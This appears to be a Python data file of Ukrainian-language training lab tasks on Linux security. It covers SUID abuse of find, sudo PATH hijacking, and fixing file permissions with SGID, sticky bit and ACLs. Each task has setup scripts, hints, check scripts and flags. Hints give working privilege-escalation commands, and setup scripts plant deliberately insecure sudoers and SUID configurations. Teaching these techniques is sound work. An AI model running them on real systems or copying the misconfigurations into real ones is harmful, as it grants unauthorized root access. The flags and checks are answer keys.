"""Security: Privilege Escalation & Access Control tasks."""

SECURITY_PRIVESC_TASKS = [
    {
        "slug": "suid_privesc",
        "title": "SUID-експлойт: втеча з непривілейованого оточення",
        "category": "Security / Privesc",
        "difficulty": "medium",
        "reward_points": 35,
        "intro": (
            "У цій задачі в тебе <b>забрали <code>sudo</code></b>. Ти звичайний користувач "
            "<code>student</code>, але адміністратор залишив у системі неправильно налаштований "
            "бінарний файл із бітом <b>SUID</b> (<code>rwsr-xr-x</code>), що виконується з правами <code>root</code>."
        ),
        "setup_script": r"""
rm -f /etc/sudoers.d/student
echo "CTF{suid_gtfobins_pwned_941}" > /root/vault_flag.txt
chmod 0400 /root/vault_flag.txt
chown root:root /root/vault_flag.txt

cp /usr/bin/find /usr/local/bin/sysbackup-find
chown root:root /usr/local/bin/sysbackup-find
chmod 4755 /usr/local/bin/sysbackup-find
""",
        "steps": [
            {
                "text": (
                    "Знайди нестандартний SUID-бінарник у каталозі <code>/usr/local/bin</code>, який належить "
                    "<code>root</code>, і запиши його <b>повний шлях</b> у <code>~/suid_bin.txt</code>."
                ),
                "hint": "Пошук SUID-файлів: <code>find /usr/local/bin -perm -4000 -type f 2&gt;/dev/null</code>",
                "check": r"""
[ "$(tr -d '[:space:]' 2>/dev/null < /home/student/suid_bin.txt)" = "/usr/local/bin/sysbackup-find" ]
""",
            },
            {
                "text": (
                    "Використай знайдений SUID-бінарник, щоб прочитати закритий файл <code>/root/vault_flag.txt</code> "
                    "(права <code>0400</code>), і збережи прапор у <code>~/flag.txt</code>."
                ),
                "hint": (
                    "Утиліта <code>find</code> має прапорець <code>-exec</code>: "
                    "<code>/usr/local/bin/sysbackup-find /root -name vault_flag.txt -exec cat {} + &gt; ~/flag.txt</code>"
                ),
                "check": r"""
[ "$(tr -d '[:space:]' 2>/dev/null < /home/student/flag.txt)" = "CTF{suid_gtfobins_pwned_941}" ]
""",
            },
            {
                "text": (
                    "Виправ вразливість (remediation): скористайся цим же SUID-бінарником, щоб <b>зняти SUID-біт</b> "
                    "із самого себе (<code>/usr/local/bin/sysbackup-find</code> має мати права <code>0755</code>)."
                ),
                "hint": (
                    "Виконай <code>chmod</code> через сам SUID-бінарник: "
                    "<code>/usr/local/bin/sysbackup-find /root -maxdepth 0 -exec chmod 0755 /usr/local/bin/sysbackup-find \\;</code>"
                ),
                "check": r"""
[ "$(stat -c '%a' /usr/local/bin/sysbackup-find 2>/dev/null)" = "755" ]
""",
            },
        ],
    },
    {
        "slug": "sudo_path_hijack",
        "title": "Компрометація sudo: PATH Hijacking",
        "category": "Security / Privesc",
        "difficulty": "hard",
        "reward_points": 40,
        "intro": (
            "Повний доступ до <code>sudo</code> вимкнено, але в <code>sudo -l</code> дозволено запускати "
            "один адміністративний скрипт від <code>root</code>. Досліди скрипт та використай перехоплення "
            "шляху пошуку виконуваних файлів (<b>PATH Hijacking</b>)."
        ),
        "setup_script": r"""
sed -i 's/^Defaults\s\+secure_path/# Defaults secure_path/' /etc/sudoers
cat > /etc/sudoers.d/student <<'EOF'
Defaults !secure_path
Defaults env_keep += "PATH"
student ALL=(root) NOPASSWD: /opt/sysadmin/diag.sh
EOF
chmod 440 /etc/sudoers.d/student

mkdir -p /opt/sysadmin
cat > /opt/sysadmin/diag.sh <<'EOF'
#!/bin/bash
echo "[*] Running system diagnostics..."
portcheck-util --quick
EOF
chown root:root /opt/sysadmin/diag.sh
chmod 755 /opt/sysadmin/diag.sh

cat > /usr/local/bin/portcheck-util <<'EOF'
#!/bin/bash
echo "All local ports healthy."
EOF
chown root:root /usr/local/bin/portcheck-util
chmod 755 /usr/local/bin/portcheck-util

echo "CTF{path_hijack_root_escalation_77}" > /root/root_flag.txt
chmod 400 /root/root_flag.txt
""",
        "steps": [
            {
                "text": (
                    "Перевір свої права через <code>sudo -l</code> та проаналізуй дозволений скрипт. "
                    "Яка зовнішня утиліта викликається в ньому <b>без абсолютного шляху</b>? "
                    "Запиши лише її назву в <code>~/vuln_util.txt</code>."
                ),
                "hint": "Прочитай <code>cat /opt/sysadmin/diag.sh</code>.",
                "check": r"""
[ "$(tr -d '[:space:]' 2>/dev/null < /home/student/vuln_util.txt)" = "portcheck-util" ]
""",
            },
            {
                "text": (
                    "Підміни цю утиліту через змінну <code>PATH</code> при виклику <code>sudo /opt/sysadmin/diag.sh</code>, "
                    "щоб прочитати <code>/root/root_flag.txt</code> і записати прапор у <code>~/flag.txt</code>."
                ),
                "hint": (
                    "Створи виконуваний скрипт <code>/tmp/portcheck-util</code>, який копіює <code>/root/root_flag.txt</code> "
                    "у <code>/home/student/flag.txt</code> (та дає права <code>chmod 644</code>), і запусти: "
                    "<code>PATH=/tmp:$PATH sudo /opt/sysadmin/diag.sh</code>"
                ),
                "check": r"""
[ "$(tr -d '[:space:]' 2>/dev/null < /home/student/flag.txt)" = "CTF{path_hijack_root_escalation_77}" ]
""",
            },
            {
                "text": (
                    "Використай отримані привілеї <code>root</code>, щоб усунути вразливість: "
                    "заміни виклик у <code>/opt/sysadmin/diag.sh</code> на безпечний абсолютний шлях "
                    "<code>/usr/local/bin/portcheck-util --quick</code> та видали <code>env_keep</code> і "
                    "<code>!secure_path</code> із <code>/etc/sudoers.d/student</code>."
                ),
                "hint": (
                    "У своєму <code>/tmp/portcheck-util</code> виконай: "
                    "<code>sed -i 's|portcheck-util|/usr/local/bin/portcheck-util|' /opt/sysadmin/diag.sh</code> "
                    "та <code>sed -i '/env_keep\\|secure_path/d' /etc/sudoers.d/student</code>, після чого запусти "
                    "<code>PATH=/tmp:$PATH sudo /opt/sysadmin/diag.sh</code>."
                ),
                "check": r"""
grep -q '/usr/local/bin/portcheck-util --quick' /opt/sysadmin/diag.sh || exit 1
t=$(mktemp -d /tmp/.chkXXXXXX)
chmod 755 "$t"
printf '#!/bin/bash\necho HIJACKED\nexit 99\n' > "$t/portcheck-util"
chmod 755 "$t/portcheck-util"
if [ "$(id -u)" = 0 ]; then
  ! grep -Eq 'env_keep|!secure_path' /etc/sudoers.d/student || { rm -rf "$t"; exit 1; }
  out=$(runuser -u student -- env PATH="$t:$PATH" sudo -n /opt/sysadmin/diag.sh 2>/dev/null)
  rc=$?
else
  out=$(PATH="$t:$PATH" sudo -n /opt/sysadmin/diag.sh 2>/dev/null)
  rc=$?
fi
rm -rf "$t"
[ $rc -eq 0 ] && echo "$out" | grep -qx 'All local ports healthy.' && ! echo "$out" | grep -q 'HIJACKED'
""",
            },
        ],
    },
    {
        "slug": "acl_and_special_bits",
        "title": "Спеціальні біти доступу, POSIX ACL та захист спільних каталогів",
        "category": "Security / Access Control",
        "difficulty": "medium",
        "reward_points": 30,
        "intro": (
            "Стандартних прав <code>rwx</code> часто недостатньо для гнучкого розмежування доступу. "
            "Налаштуй безпечний спільний каталог зі <b>Sticky Bit</b> та <b>SGID</b>, усунь небезпечний "
            "світовий запис (world-writable) на конфігурації та налаштуй точкові права доступу."
        ),
        "setup_script": r"""
groupadd secops
useradd -m -s /bin/bash -G secops alice
useradd -m -s /bin/bash -G secops bob
useradd -m -s /bin/bash auditor

mkdir -p /srv/secvault/dropzone
chown root:root /srv/secvault/dropzone
chmod 0777 /srv/secvault/dropzone

echo "CTF{sticky_sgid_and_strict_perms_404}" > /srv/secvault/master.conf
chown root:secops /srv/secvault/master.conf
chmod 0666 /srv/secvault/master.conf
""",
        "steps": [
            {
                "text": (
                    "Файл <code>/srv/secvault/master.conf</code> має небезпечні права <code>0666</code> (кожен може "
                    "редагувати). Прочитай із нього прапор у <code>~/flag.txt</code>, а потім закрий права на "
                    "<code>/srv/secvault/master.conf</code> до <code>0640</code> (власник <code>root</code>, група <code>secops</code>)."
                ),
                "hint": "<code>cp /srv/secvault/master.conf ~/flag.txt &amp;&amp; sudo chmod 0640 /srv/secvault/master.conf</code>",
                "check": r"""
[ "$(tr -d '[:space:]' 2>/dev/null < /home/student/flag.txt)" = "CTF{sticky_sgid_and_strict_perms_404}" ] \
  && [ "$(stat -c '%a %U %G' /srv/secvault/master.conf)" = "640 root secops" ]
""",
            },
            {
                "text": (
                    "Налаштуй каталог <code>/srv/secvault/dropzone</code> для безпечної спільної роботи групи "
                    "<code>secops</code>: власник <code>root:secops</code>, права <code>3770</code> "
                    "(<b>SGID</b> + <b>Sticky Bit</b>: усі файли всередині успадковують групу <code>secops</code>, "
                    "а видаляти файли може лише їхній автор або root; сторонні доступу не мають)."
                ),
                "hint": "<code>sudo chown root:secops /srv/secvault/dropzone &amp;&amp; sudo chmod 3770 /srv/secvault/dropzone</code>",
                "check": r"""
[ "$(stat -c '%a %U %G' /srv/secvault/dropzone)" = "3770 root secops" ]
""",
            },
            {
                "text": (
                    "Надай користувачу <code>auditor</code> індивідуальне право <b>лише на читання</b> (<code>r--</code>) "
                    "файлу <code>/srv/secvault/master.conf</code> через POSIX ACL (<code>setfacl</code>) або додай "
                    "<code>auditor</code> до групи <code>secops</code>, не відкриваючи доступ для <code>others</code>."
                ),
                "hint": (
                    "Через ACL: <code>sudo setfacl -m u:auditor:r /srv/secvault/master.conf</code> "
                    "(або через групу: <code>sudo usermod -aG secops auditor</code>). Перевір: "
                    "<code>sudo -u auditor cat /srv/secvault/master.conf</code>."
                ),
                "check": r"""
[ $(( 0$(stat -c '%a' /srv/secvault/master.conf) & 7 )) -eq 0 ] \
  && [ "$(sudo -n -u auditor cat /srv/secvault/master.conf 2>/dev/null)" = "CTF{sticky_sgid_and_strict_perms_404}" ]
""",
            },
        ],
    },
]
